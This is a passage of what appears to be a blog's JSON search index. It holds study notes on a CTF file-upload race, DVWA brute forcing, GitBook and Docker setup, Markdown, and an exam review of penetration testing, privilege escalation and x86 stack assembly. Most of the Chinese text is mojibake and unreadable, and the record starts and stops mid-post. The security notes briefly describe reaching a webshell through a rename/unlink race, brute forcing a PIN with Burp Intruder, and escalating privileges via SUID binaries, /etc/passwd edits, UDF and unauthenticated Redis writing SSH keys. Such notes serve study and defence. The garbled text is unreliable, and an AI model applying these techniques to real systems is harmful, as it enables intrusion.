é™¤æ–‡ä»¶æ—¶é—´å·®ç»•è¿‡ã€‚è¿™é‡Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åé€šè¿‡renameä¿®æ”¹åç§°ï¼š 123$upload_file = UPLOAD_PATH . '/' . $file_name;$img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext;rename($upload_file, $img_path); å†é€šè¿‡unlinkåˆ é™¤æ–‡ä»¶: 1unlink($upload_file); å› æ­¤å¯ä»¥é€šè¿‡æ¡ä»¶ç«äº‰çš„æ–¹å¼åœ¨unlinkä¹‹å‰ï¼Œè®¿é—®webshellã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/tags/CTF/"},{"name":"Upload","slug":"Upload","permalink":"https://singlemindedt.github.io/tags/Upload/"}]},{"title":"DVWAç›¸å…³è®°å½•","slug":"DVWAç›¸å…³è®°å½•","date":"2020-08-02T06:09:37.000Z","updated":"2020-08-02T07:51:48.970Z","comments":true,"path":"2020/08/02/DVWAç›¸å…³è®°å½•/","link":"","permalink":"https://singlemindedt.github.io/2020/08/02/DVWAç›¸å…³è®°å½•/","excerpt":"","text":"æ ¹ç›®å½•ä¸‹å¯¹åº”ç›®å½•åè®¿é—®ï¼š 1æˆ‘çš„ï¼šhttp://127.0.0.1/DVWA-master/ ä½¿ç”¨admin&amp;passwordç™»å½•ï¼› ä¾‹ï¼šå·²çŸ¥å¯†ç ä¸º4ä½æ•°å­—ï¼Œçˆ†ç ´å¯†ç  è¿æ¥ï¼šhttp://10.20.64.138/brute.php getè¯·æ±‚ï¼Œ 12pass is errorhint: isset($_REQUEST['pass']) è®¿é—®ï¼š http://10.20.64.138/brute.php?pass=1234 BPæ‹¦æˆªï¼Œ Send to Intruder Payload Positions ç¡®å®šæ”»å‡»ç›®æ ‡ Payloads Payload Sets æ¨¡å—ï¼Œè®¾ç½®typeä¸ºNumberï¼› éšæœº æ•°å­—ç‰¹å¾ +++ è‡ªå®šä¹‰è¿­ä»£å™¨","categories":[],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://singlemindedt.github.io/tags/DVWA/"}]},{"title":"Gitbookå®‰è£…ä¸ä½¿ç”¨","slug":"Gitbookå®‰è£…ä¸ä½¿ç”¨","date":"2020-08-01T04:34:24.000Z","updated":"2020-08-01T05:59:29.508Z","comments":true,"path":"2020/08/01/Gitbookå®‰è£…ä¸ä½¿ç”¨/","link":"","permalink":"https://singlemindedt.github.io/2020/08/01/Gitbookå®‰è£…ä¸ä½¿ç”¨/","excerpt":"","text":"å®‰è£… æ¨èæ­é…ï¼šGit + Gitbook + Typora ç¯å¢ƒï¼š GitBook æ˜¯åŸºäº Node.jsï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆéœ€è¦å®‰è£… Node.jsï¼ˆå®‰è£… Node.js éƒ½ä¼šé»˜è®¤å®‰è£… npmï¼ˆnode åŒ…ç®¡ç†å·¥å…·ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨å•ç‹¬å®‰è£… npmï¼‰ å®‰è£…Gitbook 1npm install -g gitbook-cli ç­‰å¾…å®‰è£…å®Œæ¯•ã€‚ ä½¿ç”¨æ–°å»ºæ–‡ä»¶å¤¹æ¯”å¦‚MyGitBook,å‘½ä»¤è¡Œæ‰§è¡Œgitbook init; +++ æ³¨æ„ï¼š å¯èƒ½é‡åˆ°ä»¥ä¸‹é—®é¢˜ï¼š æˆ– installing gitbook xxx æ—¶é—´è¿‡é•¿ è§£å†³æ–¹æ³•ï¼š ç”±äºå®‰è£…è¿‡ç¨‹é»˜è®¤ä½¿ç”¨å›½å¤–é•œåƒï¼Œé€Ÿåº¦è¾ƒæ…¢æˆ–è¿æ¥è¶…æ—¶ï¼Œå¯ä»¥å°†å…¶åˆ‡æ¢ä¸ºå›½å†…é•œåƒï¼› å‘½ä»¤è¡Œä¸‹ï¼šnpm config set registry=http://registry.npm.taobao.orgç›´æ¥è®¾ç½®é•œåƒ æ‰“å¼€nodejså®‰è£…æ–‡ä»¶å¤¹ä¸‹é¢çš„å­ç›®å½•node_modules\\npm\\npmrcï¼Œæ·»åŠ é…ç½®registry=http://registry.npm.taobao.org +++ Installing GitBook 3.2.3æ‰§è¡Œå®Œæ¯•åï¼Œå¦‚ä¸‹ï¼š ä¼šåœ¨MyGitBookä¸‹åˆ›å»ºï¼ŒREADME.mdå’ŒSUMMARY.mdæ–‡ä»¶ï¼› 123- GitBook - README.md(ä»‹ç»æ–‡ä»¶) - SUMMARY.md(ç›®å½•æ–‡ä»¶) +++ ç»ˆç«¯è¾“å…¥girbook serveå³å¯å¼€å¯ä¸€ä¸ª localhost:4000 çš„æœåŠ¡ï¼Œè¯·åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ http://localhost:4000 å³å¯è®¿é—®æœåŠ¡ã€‚ +++ æ­¤æ—¶ä¼šåœ¨MyGitBookç›®å½•ä¸‹ç”Ÿæˆ_bookç›®å½•ï¼Œå…¶ä¸­æ˜¯index.htmlå’Œä¸€äº›é…ç½®æ–‡ä»¶ï¼› gitbook serveæœ¬èº«åŒ…æ‹¬äº†gitbook buildå‘½ä»¤ï¼Œæ‰§è¡Œ gitbook build å‘½ä»¤æ„å»ºä¹¦ç±ï¼Œé»˜è®¤å°†ç”Ÿæˆçš„é™æ€ç½‘ç«™è¾“å‡ºåˆ° _book ç›®å½•ï¼› +++ å‚è€ƒï¼š 1 2","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"Markdownè¯­æ³•è®°å½•","slug":"Markdownè¯­æ³•è®°å½•","date":"2020-07-31T15:51:42.000Z","updated":"2020-08-02T05:54:55.084Z","comments":true,"path":"2020/07/31/Markdownè¯­æ³•è®°å½•/","link":"","permalink":"https://singlemindedt.github.io/2020/07/31/Markdownè¯­æ³•è®°å½•/","excerpt":"","text":"é¢œè‰²ã€å­—ä½“ã€å¤§å°æµ‹è¯•0 1&lt;font color=#ff000 face=\"é»‘ä½“\" size=4&gt;æµ‹è¯•0&lt;/font&gt; æµ‹è¯•1 1&lt;font color =#000000 face =\"åæ–‡å½©äº‘\" size=4&gt;æµ‹è¯•1&lt;/font&gt; æ³¨é‡Š ä»£ç æ³• 123&lt;div style='display: none'&gt;æ³¨é‡Š0&lt;/div&gt; htmlæ³¨é‡Š æ—¢ç„¶æ”¯æŒhtmlè¯­æ³•ï¼Œé‚£ä¹Ÿæ”¯æŒhtmlæ³¨é‡Šï¼Œå¿«æ·é”® comment + /ã€‚ 123456&lt;!--æ³¨é‡Š1--&gt;&lt;!--å¤šæ®µæ³¨é‡Šï¼Œ2 --&gt; hackæ–¹æ³• hackæ–¹æ³•å°±æ˜¯åˆ©ç”¨markdownçš„è§£æåŸç†æ¥å®ç°æ³¨é‡Šçš„ã€‚ ä¸€èˆ¬æœ‰çš„markdownè§£æå™¨ä¸æ”¯æŒä¸Šé¢çš„æ³¨é‡Šæ–¹æ³•ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç”¨hackæ–¹æ³•ã€‚ hackæ–¹æ³•æ¯”ä¸Šé¢2ç§æ–¹æ³•ç¨³å®šå¾—å¤šï¼Œä½†æ˜¯è¯­ä¹‰åŒ–å¤ªå·®ã€‚ 1234[//]: # (å“ˆå“ˆæˆ‘æ˜¯æœ€å¼ºæ³¨é‡Šï¼Œä¸ä¼šåœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºã€‚)[^_^]: # (å“ˆå“ˆæˆ‘æ˜¯æœ€èŒæ³¨é‡Šï¼Œä¸ä¼šåœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºã€‚)[//]: &lt;&gt; (å“ˆå“ˆæˆ‘æ˜¯æ³¨é‡Šï¼Œä¸ä¼šåœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºã€‚)[comment]: &lt;&gt; (å“ˆå“ˆæˆ‘æ˜¯æ³¨é‡Šï¼Œä¸ä¼šåœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºã€‚) æ­¤å¤„å‚è€ƒï¼šæ‹©åŠ¿å‹¤","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"Docker-notes1","slug":"Docker-notes1","date":"2020-07-31T05:14:01.000Z","updated":"2020-07-31T15:56:47.392Z","comments":true,"path":"2020/07/31/Docker-notes1/","link":"","permalink":"https://singlemindedt.github.io/2020/07/31/Docker-notes1/","excerpt":"","text":"å–œæ¬¢é’»ç ”å’Œåˆ†äº«ï¼› åªè¦å­¦ä¸æ­»å°±å¾€æ­»é‡Œå­¦; æ¦‚å¿µ Problemsï¼š æˆ‘åœ¨æˆ‘çš„ç”µè„‘ä¸Šå¯ä»¥è¿è¡Œï¼Ÿï¼Ÿï¼Ÿ é…ç½®åº”ç”¨ç¯å¢ƒéº»çƒ¦ï¼Œä¸”ä¸å¯è·¨å¹³å° æ‰“åŒ…é¡¹ç›®å¸¦ä¸Šç¯å¢ƒï¼ˆé•œåƒï¼‰â€“&gt;ï¼ˆDockerä»“åº“=å•†åº—ï¼‰â€“&gt;ä¸‹è½½æˆ‘ä»¬å‘å¸ƒçš„é•œåƒï¼Œå¯ç›´æ¥è¿è¡Œï¼ æ€æƒ³æ¥æºï¼šé›†è£…ç®±jre:å¤šä¸ªåº”ç”¨ï¼ˆç«¯å£å†²çªï¼‰ï¼Œäº¤å‰ï¼›æ ¸å¿ƒï¼šéš”ç¦»ï¼Œæ¯ä¸ªé›†è£…ç®±éƒ½æ˜¯äº’ç›¸éš”ç¦»çš„ï¼›é€šè¿‡éš”ç¦»æœºåˆ¶å¯å°†æœåŠ¡å™¨åˆ©ç”¨åˆ°æè‡´ï¼","categories":[],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"pycharmå¼€å‘flaskæŒ‡å®šipã€ç«¯å£æ— æ•ˆ","slug":"pycharmå¼€å‘flaskæŒ‡å®šipã€ç«¯å£æ— æ•ˆ","date":"2020-06-20T16:16:09.000Z","updated":"2020-06-20T16:17:18.697Z","comments":true,"path":"2020/06/21/pycharmå¼€å‘flaskæŒ‡å®šipã€ç«¯å£æ— æ•ˆ/","link":"","permalink":"https://singlemindedt.github.io/2020/06/21/pycharmå¼€å‘flaskæŒ‡å®šipã€ç«¯å£æ— æ•ˆ/","excerpt":"","text":"pycharmå¼€å‘flaskæŒ‡å®šipã€ç«¯å£æ— æ•ˆ pythonâ€”â€“flaské¡¹ç›®ç«¯å£è®¾ç½®æ— æ•ˆ","categories":[],"tags":[{"name":"flask","slug":"flask","permalink":"https://singlemindedt.github.io/tags/flask/"}]},{"title":"ç½‘ç»œæ”»å‡»ä¸é˜²å¾¡å¤ä¹ ","slug":"ç½‘ç»œæ”»å‡»ä¸é˜²å¾¡å¤ä¹ çŸ¥è¯†ç‚¹æ€»ç»“","date":"2020-06-12T05:20:08.000Z","updated":"2020-06-12T09:07:20.241Z","comments":true,"path":"2020/06/12/ç½‘ç»œæ”»å‡»ä¸é˜²å¾¡å¤ä¹ çŸ¥è¯†ç‚¹æ€»ç»“/","link":"","permalink":"https://singlemindedt.github.io/2020/06/12/ç½‘ç»œæ”»å‡»ä¸é˜²å¾¡å¤ä¹ çŸ¥è¯†ç‚¹æ€»ç»“/","excerpt":"","text":"[TOC] +++ 1ã€Webå®‰å…¨ 2ã€é€†å‘å®‰å…¨ 3ã€ç§»åŠ¨é€šä¿¡å®‰å…¨ é¢˜å‹ï¼šè®ºè¿°é¢˜ï¼š3*10 ï¼ˆç®€ç­”é¢˜ï¼Œè®°å¿†ï¼‰ ææ–™åˆ†æé¢˜ï¼š20 ï¼ˆä»£ç ç›¸å…³web or ä»£ç æ— å…³ï¼‰ ä»£ç åˆ†æé¢˜ï¼š20+30 ï¼ˆ20Web/30REï¼‰ +++ +++ +++ Webæ–¹é¢ä»£ç ä¸»è¦è€ƒï¼šPHPä»£ç  +++ 1ã€ä»£ç å®¡è®¡ä¸æ¸—é€æµ‹è¯•çš„åŒºåˆ«å’Œä¼˜ç¼ºç‚¹â˜†â˜†â˜† æ¸—é€æµ‹è¯•ï¼ˆå¨èƒï¼šæ¥è‡ªå¤–éƒ¨å…¥ä¾µï¼‰ ä»£ç å®¡è®¡ï¼ˆè„†å¼±æ€§ï¼šç³»ç»Ÿè‡ªèº«ã€è½¯ä»¶ç­‰é—®é¢˜ï¼‰ æè¿° æ¨¡æ‹Ÿé»‘å®¢æ”»å‡»ï¼Œè¯„ä¼°ç›®æ ‡ç³»ç»Ÿå®‰å…¨æ€§ æŸ¥æ‰¾ç¨‹åºä¸­å­˜åœ¨çš„ä¸å®‰å…¨ç¼–ç  æµ‹è¯•ç›®æ ‡ åŒ…æ‹¬ä½†ä¸é™äºWebåº”ç”¨ åŸºäºæä¾›çš„ç³»ç»Ÿä»£ç ï¼Œå¯»æ‰¾ä»£ç æ¼æ´ æµ‹è¯•äº§å‡º æ¸—é€æµ‹è¯•æŠ¥å‘Š+ä¿®å¤å»ºè®® ä»£ç å®¡è®¡æŠ¥å‘Š+ä¿®å¤å»ºè®® ä¼˜ç‚¹ è´´è¿‘å®é™…åœºæ™¯ï¼Œè¿œç¨‹æ¸—é€ å…¨é¢å®¡æŸ¥ï¼Œè´´è¿‘ç³»ç»Ÿå’Œæ¶æ„ï¼Œä¿®å¤æˆæœ¬ä½ ç¼ºç‚¹ æµ‹è¯•ä¸å…¨é¢ï¼Œä¿®å¤æˆæœ¬é«˜ ç°åœºå®¡è®¡ +++ 2ã€ä»£ç å®¡è®¡æµç¨‹ æ‹¿åˆ°æºä»£ç åï¼Œå…ˆä½¿ç”¨å·¥å…·è¿›è¡Œæ•´ä½“æ‰«é¢ï¼Œç„¶åå¯¹æ‰«æç»“æ„è¿›è¡Œäººå·¥æ¼æ´ç¡®è®¤ï¼ŒåŒæ—¶ï¼Œè¿›è¡Œäººå·¥å®‰å…¨ç¼–ç å®¡è®¡ï¼Œè¿›è€Œè§£å†³ä¸€äº›å¸¸è§„æ¼æ´å’Œé€»è¾‘æ¼æ´ã€‚æœ€åç»¼åˆå®¡è®¡ç»“æ„ï¼Œç¼–å†™å¹¶æäº¤ä»£ç å®¡è®¡æŠ¥å‘Šã€‚ +++ 3ã€ä»£ç å®¡è®¡çš„é€šç”¨æ–¹æ³• +++ 4ã€PHPä»£ç å®¡è®¡ï¼šä»£ç åˆ†æï¼ˆXSSã€æ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶åŒ…å«ã€ä»£ç æ‰§è¡Œã€CSRFç­‰ï¼‰ ååºåˆ—åŒ–æ¼æ´â˜†â˜†â˜† +++ +++ æŸ¥çœ‹æ¸—é€æµ‹è¯•æ¡ˆä¾‹ï¼› +++ 1ã€æ¸—é€æµ‹è¯•çš„æµç¨‹å’Œæ¯ä¸€æ­¥è¦åšçš„å·¥ä½œæ¸—é€æµ‹è¯•åˆ†ä¸ºä¸ƒä¸ªé˜¶æ®µï¼š 1ã€ å‰æœŸäº¤äº’é˜¶æ®µ 2ã€ æƒ…æŠ¥æœé›†é˜¶æ®µ 3ã€ å¨èƒå»ºæ¨¡é˜¶æ®µ 4ã€ æ¼æ´åˆ†æé˜¶æ®µ 5ã€ æ¸—é€æ”»å‡»é˜¶æ®µ 6ã€ åæ¸—é€æ”»å‡»é˜¶æ®µ 7ã€ æŠ¥å‘Šé˜¶æ®µ 1ã€å‰æœŸäº¤äº’é˜¶æ®µ ç¡®å®šæ¸—é€æµ‹è¯•çš„èŒƒå›´ï¼ˆå…è®¸æµ‹è¯•ï¼‰å’Œç›®æ ‡ï¼ˆé¢„æœŸæ•ˆæœï¼‰ æµ‹è¯•çš„ç±»å‹ï¼ˆé»‘ç›’/ç™½ç›’ï¼‰ æ—¶é—´æ®µã€è´¹ç”¨ç­‰ ç›®æ ‡ï¼š åˆ—å‡ºæ‰€æœ‰æ¼æ´ è¯æ˜å„ç§æ¼æ´å­˜åœ¨ æµ‹è¯•å„ç§äº‹ä»¶å“åº” å¯¹ç½‘ç»œã€ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºæ¼æ´çš„æ¸—é€æ¨¡å—å¼€å‘ 2ã€æƒ…æŠ¥æœé›†é˜¶æ®µï¼ˆæœ€é‡è¦é˜¶æ®µä¹‹ä¸€ï¼Œ40-60%ï¼‰ é‡‡ç”¨å„ç§æ–¹å¼å°½å¯èƒ½æ”¶é›†ç›®æ ‡ç½‘ç»œçš„ä¿¡æ¯ å¤§è‡´æ­¥éª¤ï¼š 1ã€ ç›®æ ‡é€‰æ‹©ï¼šé€‰æ‹©æ”»å‡»ç›®æ ‡ï¼Œç¡®å®šæ”»å‡»æ•ˆæœ 2ã€ éšç§æ”¶é›†ï¼šç°åœºæ‰‹æœº+å¤–éƒ¨æ”¶é›† 3ã€ è¸©ç‚¹å·¥ä½œï¼šä¸»åŠ¨å’Œè¢«åŠ¨æ‰«ææŠ€æœ¯ 4ã€ éªŒè¯ç›®æ ‡çš„å®‰å…¨æœºåˆ¶ï¼šé˜²ç«å¢™ã€ç½‘ç»œæµé‡è¿‡æ»¤ç³»ç»Ÿã€ç½‘ç»œå’Œä¸»æœºçš„ä¿æŠ¤æªæ–½ 3ã€å¨èƒå»ºæ¨¡é˜¶æ®µ æ¨¡æ‹Ÿå‡ºå¯¹ç›®æ ‡çš„å¨èƒä»¥åŠå¨èƒçš„ä½œç”¨ï¼Œæ ¹æ®å¨èƒå¯èƒ½å¯¹ç›®æ ‡ç³»ç»Ÿäº§ç”Ÿçš„å½±å“è¿›è¡Œåˆ†ç±» ç»“åˆä¿¡æ¯æ”¶é›†é˜¶æ®µä½œå‡ºçš„åˆ†æï¼Œç¡®å®šæœ€ä½³çš„æ”»å‡»æ–¹å¼ éœ€è¦è§£å†³çš„é—®é¢˜ï¼š å¦‚ä½•æ”»å‡»æŒ‡å®šçš„ç½‘ç»œï¼Ÿ éœ€è¦è·å–çš„é‡è¦ä¿¡æ¯æ˜¯ä»€ä¹ˆï¼Ÿ é‡‡å–ä»€ä¹ˆæ”»å‡»æ–¹å¼æœ€åˆé€‚ï¼Ÿ å¯¹ç›®æ ‡æœ€å¤§çš„å®‰å…¨å¨èƒæ˜¯ä»€ä¹ˆï¼Ÿ (æ¼æ´æ‰«æå·¥å…·ï¼ˆ Nexposeæˆ– Metasploit Proï¼‰å¯ä»¥å¸®åŠ©è‡ªåŠ¨åŒ–çš„å¿«é€Ÿçš„å®Œæˆå¨èƒå»ºæ¨¡) 4ã€æ¼æ´åˆ†æé˜¶æ®µ 5ã€æ¸—é€æ”»å‡»é˜¶æ®µ æ¸—é€æ”»å‡»é˜¶æ®µå¯ä»¥åˆ©ç”¨ä»¥å‰æ¼æ´åˆ†æé˜¶æ®µçš„æˆæœï¼Œæ˜¯çœŸæ­£çš„æ”»å‡»é˜¶æ®µ 6ã€åæ¸—é€æ”»å‡»é˜¶æ®µ åæ¸—é€æ”»å‡»é˜¶æ®µåŒ…æ‹¬äº†å½“æˆåŠŸæ¸—é€æ”»å‡»åˆ°å¯¹æ–¹è®¡ç®—æœºä»¥åçš„å¾ˆå¤šä»»åŠ¡ï¼Œæ¯”å¦‚ææƒã€ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶ã€è·³æ¿æ”»å‡»ç­‰ ï¼ˆä»¥ç‰¹å®šçš„ä¸šåŠ¡ç³»ç»Ÿä¸ºç›®æ ‡ï¼Œè¯†åˆ«å²€å…³é”®åŸºç¡€è®¾æ–½ï¼Œå¹¶å¯»æ‰¾å®¢æˆ·æœ€æœ‰ä»·å€¼çš„èµ„äº§ï¼‰ 7ã€æŠ¥å‘Šé˜¶æ®µæŠ¥å‘Šçš„ä¸»è¦ç»„æˆéƒ¨åˆ†ï¼š ç¡®å®šç›®æ ‡æœ€ä¸ºé‡è¦çš„å¨èƒ å°†æ¸—é€æµ‹è¯•å¾—åˆ°çš„æ•°æ®ç”Ÿæˆè¡¨æ ¼å’Œå›¾è¡¨ å¯¹ç›®æ ‡ç³»ç»Ÿçš„æ”¹è¿›å»ºè®® å¯¹é—®é¢˜çš„ä¿®å¤æ–¹æ¡ˆ +++ +++ éœ€è¦ç”¨è‡ªå·±çš„è¯­è¨€æè¿°ï¼› +++ 1ã€ä¸ºä»€ä¹ˆè¦ææƒï¼Ÿææƒï¼šåˆ©ç”¨æ“ä½œç³»ç»Ÿæˆ–åº”ç”¨è½¯ä»¶ä¸­çš„ç¨‹åºé”™è¯¯ã€è®¾è®¡ç¼ºé™·æˆ–é…ç½®ä¸å½“æ¥è·å–å—ä¿æŠ¤èµ„æºçš„é«˜çº§è®¿é—®æƒé™ åæ¸—é€æµ‹è¯•é˜¶æ®µï¼Œè·å¾—äº†ç›®æ ‡ç³»ç»Ÿä½æƒé™çš„Shellï¼Œå¯¹ç›®æ ‡çš„æŸäº›è®¿é—®ä¾æ—§å—é™ éœ€è¦è¿›è¡Œææƒæ“ä½œï¼Œæ¥è·å¾—ç›®æ ‡ç³»ç»Ÿçš„æœ€é«˜æƒé™ +++ 2ã€ææƒçš„æ–¹æ³•å’Œæ­¥éª¤/ä¸åŒæ“ä½œç³»ç»Ÿä¸‹çš„ææƒæŠ€æœ¯1ã€Windowsç³»ç»Ÿææƒçš„ä¸€èˆ¬æ­¥éª¤ åˆ©ç”¨å†…æ ¸æ¼æ´ææƒï¼ˆMS13_053 etc.ï¼‰ åˆ©ç”¨æ“ä½œç³»ç»Ÿæ¼æ´ææƒï¼š åˆ©ç”¨åº”ç”¨ç¨‹åºæ¼æ´ææƒ 2ã€Linuxç³»ç»Ÿææƒ SUIDç¨‹åºææƒ ä¿®æ”¹ç”¨æˆ·å±ç»„ï¼ˆæ–‡ä»¶æƒé™é…ç½®ä¸å½“ï¼‰ ä¿®æ”¹/etc/ passwd ä¿®æ”¹rootç”¨æˆ·sshå¯†é’¥ é€šé…ç¬¦ææƒ åº”ç”¨ç¨‹åºææƒ 3ã€æ•°æ®åº“UDFææƒUDF:User Defined Function å‰ææ¡ä»¶ï¼š è·å¾—rootè´¦æˆ·å¯†ç  æ•°æ®åº“å¼€å¯ plugin æ•°æ®åº“ç›‘å¬å…¬ç½‘ 4ã€Redisææƒï¼ˆæœªæˆæƒè®¿é—®ç­‰æ¼æ´ï¼‰Redisæ•°æ®åº“ä»¥rootæƒé™å¯åŠ¨ï¼Œé…åˆæœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¿æ¥æ•°æ®åº“å¹¶å†™å…¥sshå¯†é’¥ï¼Œæ¥ç€å°±å¯ä»¥ä»¥rootç”¨æˆ·èº«ä»½ç™»å½•æœåŠ¡å™¨ +++ 3ã€ææƒçš„é˜²å¾¡ åŠæ—¶æ‰“è¡¥ä¸ å¯åŠ¨Webã€DBæœåŠ¡æ—¶ä»¥ä½æƒé™å¯åŠ¨ï¼ˆæœ€å°æƒé™åŸåˆ™ï¼‰ æœåŠ¡åªç›‘å¬127.0.0.1ï¼ˆä¸è¦å¼€åœ¨å…¬ç½‘ï¼‰ +++ +++ æœ€åä¸€é¢˜30åˆ†ï¼ˆREï¼Œåˆ†ææ±‡ç¼–è¯­è¨€ä»£ç ï¼›ç»™å‡ºé«˜çº§è¯­è¨€ç”¨æ±‡ç¼–åˆ†æ/ç»™å‡ºä»»åŠ¡è¦æ±‚å†™å‡ºæ±‡ç¼–ï¼›è¯¾ä¸Šç”¨åˆ°çš„â€”å…³äºå †æ ˆæ–¹é¢çš„æ±‡ç¼–ä»£ç ï¼‰ ç»™å‡ºæ±‡ç¼–ï¼Œè¯´æ˜è¯¥æ®µä»£ç çš„å…·ä½“æ„ä¹‰ï¼Œå¦‚ä½•å·¥ä½œï¼› è°ƒç”¨çº¦å®šï¼Œå››ç§å¸¸è§çš„ï¼Œå †æ ˆçš„å˜åŒ–ï¼šæ ¹æ®ä»£ç ç”»å‡ºå †æ ˆå˜åŒ–æƒ…å†µï¼› ï¼ˆå †ï¼Œä¸è€ƒï¼‰ +++ 1ã€å­—èŠ‚åº å‡½æ•°æ ˆ&amp;EIPã€EBPã€ESP å°†ebxã€exiã€ediå‹å…¥æ ˆçš„åŸå› ï¼š 123push ebppush esipush edi ä¿å­˜å¯„å­˜å™¨åŸæœ‰çš„å€¼ï¼ˆä¿å­˜åœ¨äº†æ ˆä¸Šï¼‰ï¼ˆæ ˆå¸§åˆ‡æ¢æ—¶ä¸èƒ½ç ´åä¸Šä¸€ä¸ªå‡½æ•°ä¸­æŸäº›å¯„å­˜å™¨çš„å€¼ï¼Œå¯„å­˜å™¨åªæœ‰ä¸€ä»½ï¼Œç°åœ¨å¯„å­˜å™¨å½’æˆ‘ç”¨ï¼Œå¯èƒ½æ”¹å˜å¯„å­˜å™¨çš„å€¼ï¼Œå¯¼è‡´å‡½æ•°è¿”å›æ—¶å›ä¸å»ï¼Œæ‰€ä»¥è¦ä¿å­˜åŸæœ‰çš„å€¼ã€‚ï¼‰ rep stosd å¾ªç¯æŒ‡ä»¤ï¼Œå¾ªç¯ecxæ¬¡ï¼ˆ14æ¬¡ï¼‰å¾€eaxé‡Œå¡«å……CCCCCCCCï¼ˆå¡«Cçš„åŸå› ï¼šæŠŠä¹‹å‰çš„åƒåœ¾æ•°æ®æ¸…ç©ºï¼ŒINT3ä¸­æ–­ï¼‰ 1234lea edi,dword ptr ss:[ebp-50]//leaå–åç§»åœ°å€mov ecx,14mov eax,CCCCCCCCrep stosd dsæ®µï¼ˆæ•°æ®æ®µï¼‰ï¼› 123456mov al,byte ptr ds:[424A30]mov byte ptr ss:[ebp-4],al.......... ç”±äºæ— æ³•åœ¨å†…å­˜ä¸­ä¼ é€’æ•°æ®ï¼Œæ‰€ä»¥å…ˆæŠŠå†…å­˜æ•°æ®ä¼ å…¥CPUï¼Œå†ä»CPUä¼ åˆ°å†…å­˜çš„æ ˆä¸Šå» å¯¹å­—ç¬¦ä¸²æ“ä½œï¼Œä¼ çš„æ˜¯å­—ç¬¦ä¸²çš„åœ°å€ 1mov dword ptr ss:[ebp-10],zijixu.424A38:&quot;abcde&quot; å¼‚æˆ–æ“ä½œ 1xor eax,eax æ¸…é›¶æ“ä½œï¼Œä»£è¡¨return 0ï¼›é»˜è®¤å‡½æ•°è¿”å›å€¼éƒ½æ˜¯æ”¾åœ¨eaxé‡Œï¼Œé€šè¿‡å¼‚æˆ–æ“ä½œå°†è¿”å›å€¼ç½®é›¶ï¼› ä¸ºä»€ä¹ˆä¸ç”¨mov eax,0x0æ¸…é›¶? æ•ˆç‡ä½ï¼Œå å†…å­˜ è¿˜åŸæ ˆ 12mov esp,ebp//å°†pop ebp å°†æ ˆé¡¶çš„åœ°å€å¼¹åˆ°EIPä¸­ 1ret +++ å‹æ ˆecxï¼Œæ­¤æ—¶æ ˆé¡¶espå°±æ˜¯ecxé‡Œçš„å€¼ï¼Œæ•…ä¹‹åæ‰“å°çš„ç»“æœåº”è¯¥éƒ½æ˜¯ecxçš„å€¼ï¼› +++ 2ã€æ±‡ç¼–åŸºç¡€ï¼ˆç»™å®šä»£ç èƒ½è¯´æ˜å…¶å«ä¹‰ï¼‰ +++ 3ã€è°ƒç”¨çº¦å®šï¼ˆç›¸å…³çš„æ±‡ç¼–ä»£ç åˆ†æå’Œæ ˆçš„å˜åŒ–æƒ…å†µï¼‰â˜†â˜†â˜† æ ˆå¸§ï¼šç¨‹åºè¿è¡Œæ—¶æ ˆä¸­åˆ†é…çš„å†…å­˜å—ï¼Œä¸“é—¨ç”¨äºç‰¹å®šçš„å‡½æ•°è°ƒç”¨ æ ˆå¸§çš„å¤§è‡´ç»“æ„ï¼š è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶çš„æ“ä½œæ­¥éª¤ï¼š è°ƒç”¨æ–¹å°†è¢«è°ƒç”¨å‡½æ•°æ‰€éœ€å‚æ•°æ”¾å…¥åˆ°å‡½æ•°æ‰€é‡‡ç”¨çš„è°ƒç”¨çº¦å®šæŒ‡å®šçš„ä½ç½® è°ƒç”¨æ–¹å°†æ§åˆ¶æƒè½¬äº¤ç»™è¢«è°ƒç”¨å‡½æ•°ï¼ˆcallï¼‰ï¼Œç„¶åè¿”å›åœ°å€è¢«ä¿å­˜åˆ°ç¨‹åºæ ˆæˆ–CPUå¯„å­˜å™¨ä¸­ è¢«è°ƒç”¨å‡½æ•°ä¸ºå±€éƒ¨å˜é‡åˆ†é…ç©ºé—´ è¢«è°ƒç”¨å‡½æ•°æ‰§è¡Œæ“ä½œ è¢«è°ƒç”¨å‡½æ•°å®Œæˆæ“ä½œï¼Œé‡Šæ”¾å±€éƒ¨å˜é‡çš„æ ˆç©ºé—´ è¢«è°ƒç”¨å‡½æ•°å°†æ§åˆ¶æƒè¿”è¿˜ç»™è°ƒç”¨æ–¹ï¼ˆretï¼‰ +++ +++ +++ cdeclâ˜†â˜†â˜† 123456add esp,10h //ç›¸å½“äºè°ƒç”¨æ–¹æ¸…æ ˆ(è°ƒç”¨æ–¹è°ƒæ•´æ ˆå¸§))ï¼ˆesp+10h,ç”±äºæ ˆåœ¨å†…å­˜ä¸­è¡¨ç°ä¸ºä»é«˜åœ°å€å¾€ä½åœ°å€å¢é•¿ï¼Œespæ ˆé¡¶+16ç›¸å½“äºå‹ç¼©æ ˆï¼‰1ã€å…ˆè¿›åå‡ºã€‚2ã€åœ¨å†…å­˜ä¸­è¡¨ç°ä¸ºä»é«˜åœ°å€å¾€ä½åœ°å€å¢é•¿ã€‚(ä»é«˜åœ°å€å‹æ 